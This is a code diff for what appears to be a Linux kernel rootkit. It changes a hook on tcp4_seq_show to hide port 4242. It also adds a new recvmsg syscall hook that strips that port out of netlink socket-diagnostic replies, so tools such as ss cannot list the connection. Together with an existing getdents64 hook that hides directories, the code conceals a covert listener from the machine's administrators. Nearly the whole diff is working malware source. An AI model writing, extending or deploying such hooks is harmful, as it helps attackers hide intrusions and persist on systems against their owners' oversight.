@@ -5,6 +5,7 @@ spinlock_t hidden_dirs_lock = __SPIN_LOCK_UNLOCKED(hidden_dirs_lock);
 
 asmlinkage int (*__orig_getdents64)(const struct pt_regs *regs) = NULL;
 asmlinkage long (*__orig_tcp4_seq_show)(struct seq_file *seq, void *v);
+asmlinkage long (*__orig_recvmsg)(const struct pt_regs *regs);
 
 asmlinkage int getdents64_hook(const struct pt_regs *regs) {
     int ret;
@@ -108,14 +109,106 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs) {
     return new_size;
 }
 
-asmlinkage long tcp4_seq_show_hook(struct seq_file *seq, void *v)
-{
+asmlinkage long tcp4_seq_show_hook(struct seq_file *seq, void *v) {
     struct sock *sk = v;
-    
+
     if (v != SEQ_START_TOKEN) {
-        if (sk->sk_num == 0x1f90)
+        if (sk->sk_num == 0x1092) // 4242
             return 0;
     }
 
     return __orig_tcp4_seq_show(seq, v);
+}
+
+// Be careful. Problems with older versions of the kernel.
+// Had a problem with struct user_msghdr... Think I figured it out.
+// Purpose: filter out the netlink socket dump for ss, and other processes
+asmlinkage long recvmsg_hook(const struct pt_regs *regs) {
+    // Call the original recvmsg syscall
+    long ret = __orig_recvmsg(regs);
+    if (ret <= 0)
+        return ret;
+
+    // Get the socket file descriptor from arguments
+    int fd = regs->di;
+    struct file *f = fget(fd);
+    if (!f) return ret;
+
+    // Get the socket structure from the file descriptor
+    struct socket *sock = f->private_data;
+    struct sock *sk = sock ? sock->sk : NULL;
+
+    // Enable hook for only the netlink socket and the diag protocol
+    // This prevents us from touching EVERY recvmsg on every daemon ouch
+    if (!sk || sk->sk_family != AF_NETLINK || sk->sk_protocol != NETLINK_SOCK_DIAG) {
+        fput(f);
+        return ret;
+    }
+    fput(f);
+
+    // Copy the user_msghdr structure from the user space
+    struct user_msghdr umh;
+    if (copy_from_user(&umh, (void __user *)regs->si, sizeof(umh)))
+        return ret;
+
+    if (umh.msg_iovlen != 1)
+        return ret;
+
+    // Copy it
+    struct iovec kv;
+    if (copy_from_user(&kv, umh.msg_iov, sizeof(kv)))
+        return ret;
+
+    // Get the raw netlink dump into kernel space
+    char *in = kmalloc(ret, GFP_KERNEL);
+    if (!in)
+        return ret;
+    if (copy_from_user(in, kv.iov_base, ret)) {
+        kfree(in);
+        return ret;
+    }
+
+    // Output buff (always the same technique)
+    char *out = kmalloc(ret, GFP_KERNEL);
+    if (!out) {
+        kfree(in);
+        return ret;
+    }
+
+    // Iterate through the netlink messages
+    size_t out_len = 0;
+    long remaining = ret;
+    for (struct nlmsghdr *nlh = (void *)in;
+         NLMSG_OK(nlh, remaining);
+         nlh = NLMSG_NEXT(nlh, remaining)) {
+        // Always copy DONE so processes know the dump ended
+        if (nlh->nlmsg_type == NLMSG_DONE) {
+            memcpy(out + out_len, nlh, nlh->nlmsg_len);
+            out_len += nlh->nlmsg_len;
+            break;
+        }
+
+        // For each inet‐diag message check the port (source)
+        // 4242 for now lol
+        if (nlh->nlmsg_type == SOCK_DIAG_BY_FAMILY) {
+            struct inet_diag_msg *d = NLMSG_DATA(nlh);
+            int sport = ntohs(d->id.idiag_sport);
+            if (sport == 4242)
+                continue;
+        }
+
+        // Else copy the full message
+        memcpy(out + out_len, nlh, nlh->nlmsg_len);
+        out_len += nlh->nlmsg_len;
+    }
+
+    // Back to user space
+    size_t err = copy_to_user(kv.iov_base, out, out_len);
+    if (err) {}
+
+    kfree(in);
+    kfree(out);
+
+    // Return the new length (not alwya smaller)
+    return out_len;
 }
